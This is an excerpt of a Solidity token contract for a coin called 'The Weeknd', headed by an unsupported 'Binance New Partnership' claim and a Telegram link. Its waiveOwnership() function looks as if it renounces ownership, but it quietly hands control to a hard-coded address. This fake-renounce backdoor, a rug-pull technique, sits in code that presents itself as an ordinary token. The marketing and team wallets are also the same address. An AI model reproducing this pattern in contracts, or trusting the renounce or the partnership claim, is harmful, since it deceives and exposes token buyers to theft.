...
/** Binance New Partnership  
    https://t.me/TheWeeknbToken
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x06F88FA255572377B6E355bcBde3E46898085888));
        _owner = address(0x06F88FA255572377B6E355bcBde3E46898085888);
    }
...
contract TheWeeknd is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "The Weeknd";
    string private _symbol = "TheWeeknd";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x1BB377cDd7F88838e55F9dc983597F4B5cB4A326);
    address payable public teamWalletAddress = payable(0x1BB377cDd7F88838e55F9dc983597F4B5cB4A326);
